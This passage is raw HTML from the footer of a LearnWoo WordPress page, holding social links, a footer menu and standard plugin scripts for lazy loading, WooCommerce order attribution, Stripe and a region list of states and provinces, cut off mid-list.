						<span class="socicon socicon-facebook" style="padding: 10px; font-size: 16px; background-color: #3e5b98"></span>

													<span class="social-icons-list-label">Like on Facebook</span>
											</a>
				</li>

			
				<li class="social-icons-list-item">
					<a href="https://twitter.com/learnwoo_com" target="_blank"  class="social-icon">
						<span class="socicon socicon-twitter" style="padding: 10px; font-size: 16px; background-color: #4da7de"></span>

													<span class="social-icons-list-label">Follow on Twitter</span>
											</a>
				</li>

			
				<li class="social-icons-list-item">
					<a href="https://www.instagram.com/learnwoodotcom" target="_blank"  class="social-icon">
						<span class="socicon socicon-instagram" style="padding: 10px; font-size: 16px; background-color: #9c7c6e"></span>

													<span class="social-icons-list-label">Follow on Instagram</span>
											</a>
				</li>

			
		</ul>

		</aside>            </div>
        </div>
    </div>
</div>

                <!-- Sub Footer -->
				    <div  class="td-sub-footer-container td-container-wrap ">
        <div class="td-container">
            <div class="td-pb-row">
                <div class="td-pb-span td-sub-footer-menu">
                    <div class="menu-footer-menu-container"><ul id="menu-footer-menu" class="td-subfooter-menu"><li id="menu-item-8134" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-first td-menu-item td-normal-menu menu-item-8134"><a href="https://learnwoo.com/terms-and-conditions/">Terms</a></li>
<li id="menu-item-8128" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-8128"><a href="https://learnwoo.com/privacy-policy/">Privacy</a></li>
<li id="menu-item-9426" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-9426"><a href="https://learnwoo.com/about-us/">About</a></li>
<li id="menu-item-31982" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-31982"><a href="https://learnwoo.com/partners/">Partners</a></li>
<li id="menu-item-8135" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-8135"><a href="https://learnwoo.com/contact-us/">Contact Us</a></li>
<li id="menu-item-43906" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-43906"><a href="https://elula.tech/careers-job-openings/">Careers</a></li>
<li id="menu-item-8122" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-8122"><a href="https://learnwoo.com/interviews/">Interviews</a></li>
<li id="menu-item-8123" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-8123"><a href="https://learnwoo.com/reviews/">Reviews</a></li>
<li id="menu-item-56112" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-56112"><a href="https://learnwoo.com/deals/">Deals</a></li>
<li id="menu-item-15558" class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-15558"><a href="https://www.facebook.com/groups/woocommerce.wordpress.ecommerce">Facebook Group</a></li>
<li id="menu-item-24095" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-24095"><a href="https://learnwoo.com/shop/">Shop</a></li>
</ul></div>                </div>

                <div class="td-pb-span td-sub-footer-copy">
                    <br><br>© LearnWoo - All rights reserved.                </div>
            </div>
        </div>
    </div>
            </div><!--close td-footer-wrap-->
			

</div><!--close td-outer-wrap-->


<script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/Newspaper\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>
<script type="rocketlazyloadscript">(function() {function maybePrefixUrlField () {
  const value = this.value.trim()
  if (value !== '' && value.indexOf('http') !== 0) {
    this.value = 'http://' + value
  }
}

const urlFields = document.querySelectorAll('.mc4wp-form input[type="url"]')
for (let j = 0; j < urlFields.length; j++) {
  urlFields[j].addEventListener('blur', maybePrefixUrlField)
}
})();</script>

    <!--

        Theme: Newspaper by tagDiv.com 2025
        Version: 12.7.1 (rara)
        Deploy mode: deploy
        
        uid: 68be65775fad0
    -->

    
<!-- Custom css from theme panel -->
<style type="text/css" media="screen"></style>

			<script type="rocketlazyloadscript">
				const lazyloadRunObserver = () => {
					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
						entries.forEach( ( entry ) => {
							if ( entry.isIntersecting ) {
								let lazyloadBackground = entry.target;
								if( lazyloadBackground ) {
									lazyloadBackground.classList.add( 'e-lazyloaded' );
								}
								lazyloadBackgroundObserver.unobserve( entry.target );
							}
						});
					}, { rootMargin: '200px 0px 200px 0px' } );
					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
						lazyloadBackgroundObserver.observe( lazyloadBackground );
					} );
				};
				const events = [
					'DOMContentLoaded',
					'elementor/lazyload/observe',
				];
				events.forEach( ( event ) => {
					document.addEventListener( event, lazyloadRunObserver );
				} );
			</script>
				<script type="rocketlazyloadscript" data-rocket-type='text/javascript'>
		(function () {
			var c = document.body.className;
			c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
			document.body.className = c;
		})();
	</script>
	


<script type="text/javascript" id="ppress-frontend-script-js-extra">
/* <![CDATA[ */
var pp_ajax_form = {"ajaxurl":"https:\/\/learnwoo.com\/wp-admin\/admin-ajax.php","confirm_delete":"Are you sure?","deleting_text":"Deleting...","deleting_error":"An error occurred. Please try again.","nonce":"ebfb72b6a5","disable_ajax_form":"false","is_checkout":"0","is_checkout_tax_enabled":"0","is_checkout_autoscroll_enabled":"true"};
/* ]]> */
</script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/wp-user-avatar/assets/js/frontend.min.js?ver=4.16.5" id="ppress-frontend-script-js"></script>
<script type="text/javascript" id="ez-toc-scroll-scriptjs-js-extra">
/* <![CDATA[ */
var eztoc_smooth_local = {"scroll_offset":"30","add_request_uri":"","add_self_reference_link":""};
/* ]]> */
</script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/easy-table-of-contents/assets/js/smooth_scroll.min.js?ver=2.0.75" id="ez-toc-scroll-scriptjs-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/easy-table-of-contents/vendor/js-cookie/js.cookie.min.js?ver=2.2.1" id="ez-toc-js-cookie-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/easy-table-of-contents/vendor/sticky-kit/jquery.sticky-kit.min.js?ver=1.9.2" id="ez-toc-jquery-sticky-kit-js"></script>
<script type="text/javascript" id="ez-toc-js-js-extra">
/* <![CDATA[ */
var ezTOC = {"smooth_scroll":"1","visibility_hide_by_default":"","scroll_offset":"30","fallbackIcon":"<span class=\"\"><span class=\"eztoc-hide\" style=\"display:none;\">Toggle<\/span><span class=\"ez-toc-icon-toggle-span\"><svg style=\"fill: #999;color:#999\" xmlns=\"http:\/\/www.w3.org\/2000\/svg\" class=\"list-377408\" width=\"20px\" height=\"20px\" viewBox=\"0 0 24 24\" fill=\"none\"><path d=\"M6 6H4v2h2V6zm14 0H8v2h12V6zM4 11h2v2H4v-2zm16 0H8v2h12v-2zM4 16h2v2H4v-2zm16 0H8v2h12v-2z\" fill=\"currentColor\"><\/path><\/svg><svg style=\"fill: #999;color:#999\" class=\"arrow-unsorted-368013\" xmlns=\"http:\/\/www.w3.org\/2000\/svg\" width=\"10px\" height=\"10px\" viewBox=\"0 0 24 24\" version=\"1.2\" baseProfile=\"tiny\"><path d=\"M18.2 9.3l-6.2-6.3-6.2 6.3c-.2.2-.3.4-.3.7s.1.5.3.7c.2.2.4.3.7.3h11c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.7s-.1-.5-.3-.7zM5.8 14.7l6.2 6.3 6.2-6.3c.2-.2.3-.5.3-.7s-.1-.5-.3-.7c-.2-.2-.4-.3-.7-.3h-11c-.3 0-.5.1-.7.3-.2.2-.3.5-.3.7s.1.5.3.7z\"\/><\/svg><\/span><\/span>","chamomile_theme_is_on":""};
/* ]]> */
</script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/easy-table-of-contents/assets/js/front.min.js?ver=2.0.75-1755605338" id="ez-toc-js-js"></script>
<script type="text/javascript" id="rocket_lazyload_css-js-extra">
/* <![CDATA[ */
var rocket_lazyload_css_data = {"threshold":"300"};
/* ]]> */
</script>
<script type="text/javascript" id="rocket_lazyload_css-js-after">
/* <![CDATA[ */
!function o(n,c,a){function u(t,e){if(!c[t]){if(!n[t]){var r="function"==typeof require&&require;if(!e&&r)return r(t,!0);if(s)return s(t,!0);throw(e=new Error("Cannot find module '"+t+"'")).code="MODULE_NOT_FOUND",e}r=c[t]={exports:{}},n[t][0].call(r.exports,function(e){return u(n[t][1][e]||e)},r,r.exports,o,n,c,a)}return c[t].exports}for(var s="function"==typeof require&&require,e=0;e<a.length;e++)u(a[e]);return u}({1:[function(e,t,r){"use strict";{const c="undefined"==typeof rocket_pairs?[]:rocket_pairs,a=(("undefined"==typeof rocket_excluded_pairs?[]:rocket_excluded_pairs).map(t=>{var e=t.selector;document.querySelectorAll(e).forEach(e=>{e.setAttribute("data-rocket-lazy-bg-"+t.hash,"excluded")})}),document.querySelector("#wpr-lazyload-bg-container"));var o=rocket_lazyload_css_data.threshold||300;const u=new IntersectionObserver(e=>{e.forEach(t=>{t.isIntersecting&&c.filter(e=>t.target.matches(e.selector)).map(t=>{var e;t&&((e=document.createElement("style")).textContent=t.style,a.insertAdjacentElement("afterend",e),t.elements.forEach(e=>{u.unobserve(e),e.setAttribute("data-rocket-lazy-bg-"+t.hash,"loaded")}))})})},{rootMargin:o+"px"});function n(){0<(0<arguments.length&&void 0!==arguments[0]?arguments[0]:[]).length&&c.forEach(t=>{try{document.querySelectorAll(t.selector).forEach(e=>{"loaded"!==e.getAttribute("data-rocket-lazy-bg-"+t.hash)&&"excluded"!==e.getAttribute("data-rocket-lazy-bg-"+t.hash)&&(u.observe(e),(t.elements||=[]).push(e))})}catch(e){console.error(e)}})}n(),function(){const r=window.MutationObserver;return function(e,t){if(e&&1===e.nodeType)return(t=new r(t)).observe(e,{attributes:!0,childList:!0,subtree:!0}),t}}()(document.querySelector("body"),n)}},{}]},{},[1]);
/* ]]> */
</script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/td-composer/legacy/Newspaper/js/tagdiv_theme.min.js?ver=12.7.1" id="td-site-min-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/td-composer/legacy/Newspaper/js/tdPostImages.js?ver=12.7.1" id="tdPostImages-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/td-composer/legacy/Newspaper/js/tdSmartSidebar.js?ver=12.7.1" id="tdSmartSidebar-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/td-composer/legacy/Newspaper/js/tdSocialSharing.js?ver=12.7.1" id="tdSocialSharing-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/td-composer/legacy/Newspaper/js/tdModalPostImages.js?ver=12.7.1" id="tdModalPostImages-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-includes/js/comment-reply.min.js?ver=6.8.2" id="comment-reply-js" async="async" data-wp-strategy="async"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/woocommerce/assets/js/sourcebuster/sourcebuster.min.js?ver=10.1.0" id="sourcebuster-js-js"></script>
<script type="text/javascript" id="wc-order-attribution-js-extra">
/* <![CDATA[ */
var wc_order_attribution = {"params":{"lifetime":1.0e-5,"session":30,"base64":false,"ajaxurl":"https:\/\/learnwoo.com\/wp-admin\/admin-ajax.php","prefix":"wc_order_attribution_","allowTracking":true},"fields":{"source_type":"current.typ","referrer":"current_add.rf","utm_campaign":"current.cmp","utm_source":"current.src","utm_medium":"current.mdm","utm_content":"current.cnt","utm_id":"current.id","utm_term":"current.trm","utm_source_platform":"current.plt","utm_creative_format":"current.fmt","utm_marketing_tactic":"current.tct","session_entry":"current_add.ep","session_start_time":"current_add.fd","session_pages":"session.pgs","session_count":"udata.vst","user_agent":"udata.uag"}};
/* ]]> */
</script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/woocommerce/assets/js/frontend/order-attribution.min.js?ver=10.1.0" id="wc-order-attribution-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/td-cloud-library/assets/js/js_files_for_front.min.js?ver=d578089f160957352b9b4ca6d880fd8f" id="tdb_js_files_for_front-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://js.stripe.com/v3/?ver=6.8.2" id="pms-stripe-js-js"></script>
<script type="text/javascript" id="pms-front-end-js-extra">
/* <![CDATA[ */
var pmsGdpr = {"delete_url":"https:\/\/learnwoo.com?pms_user=0&pms_action=pms_delete_user&pms_nonce=f89366c7bf","delete_text":"Type DELETE to confirm deleting your account and all data associated with it:","delete_error_text":"You did not type DELETE. Try again!"};
var PMS_States = {"US":{"AL":"Alabama","AK":"Alaska","AZ":"Arizona","AR":"Arkansas","CA":"California","CO":"Colorado","CT":"Connecticut","DE":"Delaware","DC":"District Of Columbia","FL":"Florida","GA":"Georgia","HI":"Hawaii","ID":"Idaho","IL":"Illinois","IN":"Indiana","IA":"Iowa","KS":"Kansas","KY":"Kentucky","LA":"Louisiana","ME":"Maine","MD":"Maryland","MA":"Massachusetts","MI":"Michigan","MN":"Minnesota","MS":"Mississippi","MO":"Missouri","MT":"Montana","NE":"Nebraska","NV":"Nevada","NH":"New Hampshire","NJ":"New Jersey","NM":"New Mexico","NY":"New York","NC":"North Carolina","ND":"North Dakota","OH":"Ohio","OK":"Oklahoma","OR":"Oregon","PA":"Pennsylvania","RI":"Rhode Island","SC":"South Carolina","SD":"South Dakota","TN":"Tennessee","TX":"Texas","UT":"Utah","VT":"Vermont","VA":"Virginia","WA":"Washington","WV":"West Virginia","WI":"Wisconsin","WY":"Wyoming","AA":"Armed Forces (AA)","AE":"Armed Forces (AE)","AP":"Armed Forces (AP)","AS":"American Samoa","GU":"Guam","MP":"Northern Mariana Islands","PR":"Puerto Rico","UM":"US Minor Outlying Islands","VI":"US Virgin Islands"},"NZ":{"NL":"Northland","AK":"Auckland","WA":"Waikato","BP":"Bay of Plenty","TK":"Taranaki","GI":"Gisborne","HB":"Hawke&rsquo;s Bay","MW":"Manawatu-Wanganui","WE":"Wellington","NS":"Nelson","MB":"Marlborough","TM":"Tasman","WC":"West Coast","CT":"Canterbury","OT":"Otago","SL":"Southland"},"PH":{"ABR":"Abra","AGN":"Agusan del Norte","AGS":"Agusan del Sur","AKL":"Aklan","ALB":"Albay","ANT":"Antique","APA":"Apayao","AUR":"Aurora","BAS":"Basilan","BAN":"Bataan","BTN":"Batanes","BTG":"Batangas","BEN":"Benguet","BIL":"Biliran","BOH":"Bohol","BUK":"Bukidnon","BUL":"Bulacan","CAG":"Cagayan","CAN":"Camarines Norte","CAS":"Camarines Sur","CAM":"Camiguin","CAP":"Capiz","CAT":"Catanduanes","CAV":"Cavite","CEB":"Cebu","COM":"Compostela Valley","NCO":"Cotabato","DAV":"Davao del Norte","DAS":"Davao del Sur","DAC":"Davao Occidental","DAO":"Davao Oriental","DIN":"Dinagat Islands","EAS":"Eastern Samar","GUI":"Guimaras","IFU":"Ifugao","ILN":"Ilocos Norte","ILS":"Ilocos Sur","ILI":"Iloilo","ISA":"Isabela","KAL":"Kalinga","LUN":"La Union","LAG":"Laguna","LAN":"Lanao del Norte","LAS":"Lanao del Sur","LEY":"Leyte","MAG":"Maguindanao","MAD":"Marinduque","MAS":"Masbate","MSC":"Misamis Occidental","MSR":"Misamis Oriental","MOU":"Mountain Province","NEC":"Negros Occidental","NER":"Negros Oriental","NSA":"Northern Samar","NUE":"Nueva Ecija","NUV":"Nueva Vizcaya","MDC":"Occidental Mindoro","MDR":"Oriental Mindoro","PLW":"Palawan","PAM":"Pampanga","PAN":"Pangasinan","QUE":"Quezon","QUI":"Quirino","RIZ":"Rizal","ROM":"Romblon","WSA":"Samar","SAR":"Sarangani","SIQ":"Siquijor","SOR":"Sorsogon","SCO":"South Cotabato","SLE":"Southern Leyte","SUK":"Sultan Kudarat","SLU":"Sulu","SUN":"Surigao del Norte","SUR":"Surigao del Sur","TAR":"Tarlac","TAW":"Tawi-Tawi","ZMB":"Zambales","ZAN":"Zamboanga del Norte","ZAS":"Zamboanga del Sur","ZSI":"Zamboanga Sibugay","00":"Metro Manila"},"ID":{"AC":"Daerah Istimewa Aceh","SU":"Sumatera Utara","SB":"Sumatera Barat","RI":"Riau","KR":"Kepulauan Riau","JA":"Jambi","SS":"Sumatera Selatan","BB":"Bangka Belitung","BE":"Bengkulu","LA":"Lampung","JK":"DKI Jakarta","JB":"Jawa Barat","BT":"Banten","JT":"Jawa Tengah","JI":"Jawa Timur","YO":"Daerah Istimewa Yogyakarta","BA":"Bali","NB":"Nusa Tenggara Barat","NT":"Nusa Tenggara Timur","KB":"Kalimantan Barat","KT":"Kalimantan Tengah","KI":"Kalimantan Timur","KS":"Kalimantan Selatan","KU":"Kalimantan Utara","SA":"Sulawesi Utara","ST":"Sulawesi Tengah","SG":"Sulawesi Tenggara","SR":"Sulawesi Barat","SN":"Sulawesi Selatan","GO":"Gorontalo","MA":"Maluku","MU":"Maluku Utara","PA":"Papua","PB":"Papua Barat"},"IN":{"AP":"Andhra Pradesh","AR":"Arunachal Pradesh","AS":"Assam","BR":"Bihar","CT":"Chhattisgarh","GA":"Goa","GJ":"Gujarat","HR":"Haryana","HP":"Himachal Pradesh","JK":"Jammu and Kashmir","JH":"Jharkhand","KA":"Karnataka","KL":"Kerala","MP":"Madhya Pradesh","MH":"Maharashtra","MN":"Manipur","ML":"Meghalaya","MZ":"Mizoram","NL":"Nagaland","OR":"Orissa","PB":"Punjab","RJ":"Rajasthan","SK":"Sikkim","TN":"Tamil Nadu","TS":"Telangana","TR":"Tripura","UK":"Uttarakhand","UP":"Uttar Pradesh","WB":"West Bengal","AN":"Andaman and Nicobar Islands","CH":"Chandigarh","DN":"Dadar and Nagar Haveli","DD":"Daman and Diu","DL":"Delhi","LD":"Lakshadeep","PY":"Pondicherry (Puducherry)"},"HK":{"HONG KONG":"Hong Kong Island","KOWLOON":"Kowloon","NEW TERRITORIES":"New Territories"},"PE":{"CAL":"El Callao","LMA":"Municipalidad Metropolitana de Lima","AMA":"Amazonas","ANC":"Ancash","APU":"Apur&iacute;mac","ARE":"Arequipa","AYA":"Ayacucho","CAJ":"Cajamarca","CUS":"Cusco","HUV":"Huancavelica","HUC":"Hu&aacute;nuco","ICA":"Ica","JUN":"Jun&iacute;n","LAL":"La Libertad","LAM":"Lambayeque","LIM":"Lima","LOR":"Loreto","MDD":"Madre de Dios","MOQ":"Moquegua","PAS":"Pasco","PIU":"Piura","PUN":"Puno","SAM":"San Mart&iacute;n","TAC":"Tacna","TUM":"Tumbes","UCA":"Ucayali"},"BD":{"BAG":"Bagerhat","BAN":"Bandarban","BAR":"Barguna","BARI":"Barisal","BHO":"Bhola","BOG":"Bogra","BRA":"Brahmanbaria","CHA":"Chandpur","CHI":"Chittagong","CHU":"Chuadanga","COM":"Comilla","COX":"Cox's Bazar","DHA":"Dhaka","DIN":"Dinajpur","FAR":"Faridpur ","FEN":"Feni","GAI":"Gaibandha","GAZI":"Gazipur","GOP":"Gopalganj","HAB":"Habiganj","JAM":"Jamalpur","JES":"Jessore","JHA":"Jhalokati","JHE":"Jhenaidah","JOY":"Joypurhat","KHA":"Khagrachhari","KHU":"Khulna","KIS":"Kishoreganj","KUR":"Kurigram","KUS":"Kushtia","LAK":"Lakshmipur","LAL":"Lalmonirhat","MAD":"Madaripur","MAG":"Magura","MAN":"Manikganj ","MEH":"Meherpur","MOU":"Moulvibazar","MUN":"Munshiganj","MYM":"Mymensingh","NAO":"Naogaon","NAR":"Narail","NARG":"Narayanganj","NARD":"Narsingdi","NAT":"Natore","NAW":"Nawabganj","NET":"Netrakona","NIL":"Nilphamari","NOA":"Noakhali","PAB":"Pabna","PAN":"Panchagarh","PAT":"Patuakhali","PIR":"Pirojpur","RAJB":"Rajbari","RAJ":"Rajshahi","RAN":"Rangamati","RANP":"Rangpur","SAT":"Satkhira","SHA":"Shariatpur","SHE":"Sherpur","SIR":"Sirajganj","SUN":"Sunamganj","SYL":"Sylhet","TAN":"Tangail","THA":"Thakurgaon"},"BG":{"BG-01":"Blagoevgrad","BG-02":"Burgas","BG-08":"Dobrich","BG-07":"Gabrovo","BG-26":"Haskovo","BG-09":"Kardzhali","BG-10":"Kyustendil","BG-11":"Lovech","BG-12":"Montana","BG-13":"Pazardzhik","BG-14":"Pernik","BG-15":"Pleven","BG-16":"Plovdiv","BG-17":"Razgrad","BG-18":"Ruse","BG-27":"Shumen","BG-19":"Silistra","BG-20":"Sliven","BG-21":"Smolyan","BG-23":"Sofia","BG-22":"Sofia-Grad","BG-24":"Stara Zagora","BG-25":"Targovishte","BG-03":"Varna","BG-04":"Veliko Tarnovo","BG-05":"Vidin","BG-06":"Vratsa","BG-28":"Yambol"},"GR":{"I":"\u0391\u03c4\u03c4\u03b9\u03ba\u03ae","A":"\u0391\u03bd\u03b1\u03c4\u03bf\u03bb\u03b9\u03ba\u03ae \u039c\u03b1\u03ba\u03b5\u03b4\u03bf\u03bd\u03af\u03b1 \u03ba\u03b1\u03b9 \u0398\u03c1\u03ac\u03ba\u03b7","B":"\u039a\u03b5\u03bd\u03c4\u03c1\u03b9\u03ba\u03ae \u039c\u03b1\u03ba\u03b5\u03b4\u03bf\u03bd\u03af\u03b1","C":"\u0394\u03c5\u03c4\u03b9\u03ba\u03ae \u039c\u03b1\u03ba\u03b5\u03b4\u03bf\u03bd\u03af\u03b1","D":"\u0389\u03c0\u03b5\u03b9\u03c1\u03bf\u03c2","E":"\u0398\u03b5\u03c3\u03c3\u03b1\u03bb\u03af\u03b1","F":"\u0399\u03cc\u03bd\u03b9\u03bf\u03b9 \u039d\u03ae\u03c3\u03bf\u03b9","G":"\u0394\u03c5\u03c4\u03b9\u03ba\u03ae \u0395\u03bb\u03bb\u03ac\u03b4\u03b1","H":"\u03a3\u03c4\u03b5\u03c1\u03b5\u03ac \u0395\u03bb\u03bb\u03ac\u03b4\u03b1","J":"\u03a0\u03b5\u03bb\u03bf\u03c0\u03cc\u03bd\u03bd\u03b7\u03c3\u03bf\u03c2","K":"\u0392\u03cc\u03c1\u03b5\u03b9\u03bf \u0391\u03b9\u03b3\u03b1\u03af\u03bf","L":"\u039d\u03cc\u03c4\u03b9\u03bf \u0391\u03b9\u03b3\u03b1\u03af\u03bf","M":"\u039a\u03c1\u03ae\u03c4\u03b7"},"IT":{"AG":"Agrigento","AL":"Alessandria","AN":"Ancona","AO":"Aosta","AR":"Arezzo","AP":"Ascoli Piceno","AT":"Asti","AV":"Avellino","BA":"Bari","BT":"Barletta-Andria-Trani","BL":"Belluno","BN":"Benevento","BG":"Bergamo","BI":"Biella","BO":"Bologna","BZ":"Bolzano","BS":"Brescia","BR":"Brindisi","CA":"Cagliari","CL":"Caltanissetta","CB":"Campobasso","CI":"Carbonia-Iglesias","CE":"Caserta","CT":"Catania","CZ":"Catanzaro","CH":"Chieti","CO":"Como","CS":"Cosenza","CR":"Cremona","KR":"Crotone","CN":"Cuneo","EN":"Enna","FM":"Fermo","FE":"Ferrara","FI":"Firenze","FG":"Foggia","FC":"Forl\u00ec-Cesena","FR":"Frosinone","GE":"Genova","GO":"Gorizia","GR":"Grosseto","IM":"Imperia","IS":"Isernia","SP":"La Spezia","AQ":"L&apos;Aquila","LT":"Latina","LE":"Lecce","LC":"Lecco","LI":"Livorno","LO":"Lodi","LU":"Lucca","MC":"Macerata","MN":"Mantova","MS":"Massa-Carrara","MT":"Matera","ME":"Messina","MI":"Milano","MO":"Modena","MB":"Monza e della Brianza","NA":"Napoli","NO":"Novara","NU":"Nuoro","OT":"Olbia-Tempio","OR":"Oristano","PD":"Padova","PA":"Palermo","PR":"Parma","PV":"Pavia","PG":"Perugia","PU":"Pesaro e Urbino","PE":"Pescara","PC":"Piacenza","PI":"Pisa","PT":"Pistoia","PN":"Pordenone","PZ":"Potenza","PO":"Prato","RG":"Ragusa","RA":"Ravenna","RC":"Reggio Calabria","RE":"Reggio Emilia","RI":"Rieti","RN":"Rimini","RM":"Roma","RO":"Rovigo","SA":"Salerno","VS":"Medio Campidano","SS":"Sassari","SV":"Savona","SI":"Siena","SR":"Siracusa","SO":"Sondrio","TA":"Taranto","TE":"Teramo","TR":"Terni","TO":"Torino","OG":"Ogliastra","TP":"Trapani","TN":"Trento","TV":"Treviso","TS":"Trieste","UD":"Udine","VA":"Varese","VE":"Venezia","VB":"Verbano-Cusio-Ossola","VC":"Vercelli","VR":"Verona","VV":"Vibo Valentia","VI":"Vicenza","VT":"Viterbo"},"CN":{"CN1":"Yunnan \/ &#20113;&#21335;","CN2":"Beijing \/ &#21271;&#20140;","CN3":"Tianjin \/ &#22825;&#27941;","CN4":"Hebei \/ &#27827;&#21271;","CN5":"Shanxi \/ &#23665;&#35199;","CN6":"Inner Mongolia \/ &#20839;&#33945;&#21476;","CN7":"Liaoning \/ &#36797;&#23425;","CN8":"Jilin \/ &#21513;&#26519;","CN9":"Heilongjiang \/ &#40657;&#40857;&#27743;","CN10":"Shanghai \/ &#19978;&#28023;","CN11":"Jiangsu \/ &#27743;&#33487;","CN12":"Zhejiang \/ &#27993;&#27743;","CN13":"Anhui \/ &#23433;&#24509;","CN14":"Fujian \/ &#31119;&#24314;","CN15":"Jiangxi \/ &#27743;&#35199;","CN16":"Shandong \/ &#23665;&#19996;","CN17":"Henan \/ &#27827;&#21335;","CN18":"Hubei \/ &#28246;&#21271;","CN19":"Hunan \/ &#28246;&#21335;","CN20":"Guangdong \/ &#24191;&#19996;","CN21":"Guangxi Zhuang \/ &#24191;&#35199;&#22766;&#26063;","CN22":"Hainan \/ &#28023;&#21335;","CN23":"Chongqing \/ &#37325;&#24198;","CN24":"Sichuan \/ &#22235;&#24029;","CN25":"Guizhou \/ &#36149;&#24030;","CN26":"Shaanxi \/ &#38485;&#35199;","CN27":"Gansu \/ &#29976;&#32899;","CN28":"Qinghai \/ &#38738;&#28023;","CN29":"Ningxia Hui \/ &#23425;&#22799;","CN30":"Macau \/ &#28595;&#38376;","CN31":"Tibet \/ &#35199;&#34255;","CN32":"Xinjiang \/ &#26032;&#30086;"},"RO":{"AB":"Alba","AR":"Arad","AG":"Arge&#537;","BC":"Bac&#259;u","BH":"Bihor","BN":"Bistri&#539;a-N&#259;s&#259;ud","BT":"Boto&#537;ani","BR":"Br&#259;ila","BV":"Bra&#537;ov","B":"Bucure&#537;ti","BZ":"Buz&#259;u","CL":"C&#259;l&#259;ra&#537;i","CS":"Cara&#537;-Severin","CJ":"Cluj","CT":"Constan&#539;a","CV":"Covasna","DB":"D&acirc;mbovi&#539;a","DJ":"Dolj","GL":"Gala&#539;i","GR":"Giurgiu","GJ":"Gorj","HR":"Harghita","HD":"Hunedoara","IL":"Ialomi&#539;a","IS":"Ia&#537;i","IF":"Ilfov","MM":"Maramure&#537;","MH":"Mehedin&#539;i","MS":"Mure&#537;","NT":"Neam&#539;","OT":"Olt","PH":"Prahova","SJ":"S&#259;laj","SM":"Satu Mare","SB":"Sibiu","SV":"Suceava","TR":"Teleorman","TM":"Timi&#537;","TL":"Tulcea","VL":"V&acirc;lcea","VS":"Vaslui","VN":"Vrancea"},"TR":{"TR01":"Adana","TR02":"Ad&#305;yaman","TR03":"Afyon","TR04":"A&#287;r&#305;","TR05":"Amasya","TR06":"Ankara","TR07":"Antalya","TR08":"Artvin","TR09":"Ayd&#305;n","TR10":"Bal&#305;kesir","TR11":"Bilecik","TR12":"Bing&#246;l","TR13":"Bitlis","TR14":"Bolu","TR15":"Burdur","TR16":"Bursa","TR17":"&#199;anakkale","TR18":"&#199;ank&#305;r&#305;","TR19":"&#199;orum","TR20":"Denizli","TR21":"Diyarbak&#305;r","TR22":"Edirne","TR23":"Elaz&#305;&#287;","TR24":"Erzincan","TR25":"Erzurum","TR26":"Eski&#351;ehir","TR27":"Gaziantep","TR28":"Giresun","TR29":"G&#252;m&#252;&#351;hane","TR30":"Hakkari","TR31":"Hatay","TR32":"Isparta","TR33":"&#304;&#231;el","TR34":"&#304;stanbul","TR35":"&#304;zmir","TR36":"Kars","TR37":"Kastamonu","TR38":"Kayseri","TR39":"K&#305;rklareli","TR40":"K&#305;r&#351;ehir","TR41":"Kocaeli","TR42":"Konya","TR43":"K&#252;tahya","TR44":"Malatya","TR45":"Manisa","TR46":"Kahramanmara&#351;","TR47":"Mardin","TR48":"Mu&#287;la","TR49":"Mu&#351;","TR50":"Nev&#351;ehir","TR51":"Ni&#287;de","TR52":"Ordu","TR53":"Rize","TR54":"Sakarya","TR55":"Samsun","TR56":"Siirt","TR57":"Sinop","TR58":"Sivas","TR59":"Tekirda&#287;","TR60":"Tokat","TR61":"Trabz